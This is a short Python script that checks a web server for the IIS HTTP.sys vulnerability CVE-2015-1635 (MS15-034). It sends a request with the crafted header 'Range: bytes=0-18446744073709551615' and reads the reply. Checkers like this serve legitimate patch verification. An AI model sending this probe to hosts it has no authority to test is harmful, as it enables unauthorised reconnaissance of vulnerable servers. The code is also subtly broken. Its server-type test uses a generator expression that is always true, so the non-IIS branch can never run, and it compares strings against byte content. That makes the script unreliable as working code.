#!/usr/bin/env python
# -*- coding: utf-8 -*-
#date 2015/04/20
#The IIS Vul （CVE-2015-1635，MS15-034）Check Script.
#HTTP.sys Remote Code Execute.

import sys
import requests

def main():
	ip_Str = sys.argv[1]
	Check_CVE_2015_1635(ip_Str)

def Check_CVE_2015_1635(Ip_Str):
	if Ip_Str:
		Server_Tag = ['Microsoft-HTTP','Microsoft-IIS']
		Tmp_Req_Url = str(''.join(['http://',Ip_Str]))
		Request_Tmp = requests.get(Tmp_Req_Url)
		remote_server = Request_Tmp.headers[ 'server']
		if (tmp_tag in remote_server for tmp_tag in Server_Tag):
			print("[+] Web Service Is " + remote_server)
			MS15_034_Execute(Tmp_Req_Url)
		else:
			print("[+] Web Service Is Not IIS\n[+] May Be " + remote_server)

def MS15_034_Execute(domain):
	print("[+] Start Checking...")
	Req_headers = {'Host': 'stuff','Range': 'bytes=0-18446744073709551615'}
	Request = requests.get(domain, headers=Req_headers)
	if 'Requested Range Not Satisfiable' in Request.content:
		print("[+] The HTTP.sys remote code execution vulnerability Is Exists!")
	elif 'The request has an invalid header name' in Request.content:
		print("[+] The vulnerability has been fixed!")
	else:
		print("[+] The IIS service was unable to display the vulnerability exists, the need for manual testing!")

if __name__ == '__main__':
	main()
	
